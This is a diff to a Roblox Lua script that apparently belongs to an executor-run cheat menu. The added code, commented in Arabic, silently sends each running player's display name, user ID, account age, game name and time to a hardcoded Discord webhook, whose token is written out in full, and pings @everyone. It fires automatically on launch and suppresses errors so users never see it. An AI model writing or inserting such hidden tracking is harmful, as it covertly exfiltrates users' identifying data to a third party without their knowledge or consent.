@@ -1,5 +1,7 @@
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
@@ -253,3 +255,59 @@ noVoid.MouseButton1Click:Connect(function()
 	part.Parent = workspace
 
 end)
+
+-- ---------------------------
+-- إضافة كود الويب هووك (ديسكورد)
+-- ---------------------------
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1479054540450959504/GyrY5knexq_60cBAEDWKV0ILQ6fpnSPL-IzQHaVPGPL7F5bBh2btUHYT2i4FwKIu_Ctb"
+
+-- دالة إرسال الويب هوك
+local function sendWebhook(player)
+	task.spawn(function()
+		pcall(function()
+			-- نجيب اسم اللعبة
+			local gameName = "Unknown"
+			local success, productInfo = pcall(function()
+				return MarketplaceService:GetProductInfo(game.PlaceId)
+			end)
+			if success and productInfo then
+				gameName = productInfo.Name or "Unknown"
+			end
+
+			local displayName = player.DisplayName
+			local userId = tostring(player.UserId)
+			local accountAge = tostring(player.AccountAge) .. " Days"
+			local timeNow = os.date("%I:%M %p")
+
+			-- نرسل الطلب
+			local requestFunc = syn and syn.request or http_request or request
+			if requestFunc then
+				requestFunc({
+					Url = WEBHOOK_URL,
+					Method = "POST",
+					Headers = {
+						["Content-Type"] = "application/json"
+					},
+					Body = HttpService:JSONEncode({
+						content = "@everyone دخول جديد",
+						embeds = {{
+							description = "**Open script now !**",
+							color = 65280,
+							fields = {
+								{ name = "Display Name", value = displayName, inline = true },
+								{ name = "User ID", value = userId, inline = false },
+								{ name = "Account Age", value = accountAge, inline = false },
+								{ name = "Game", value = gameName, inline = false },
+								{ name = "Time", value = timeNow, inline = false }
+							},
+							timestamp = DateTime.now():ToIsoDate()
+						}}
+					})
+				})
+			end
+		end)
+	end)
+end
+
+-- إرسال الإشعار عند تشغيل السكربت
+sendWebhook(player)
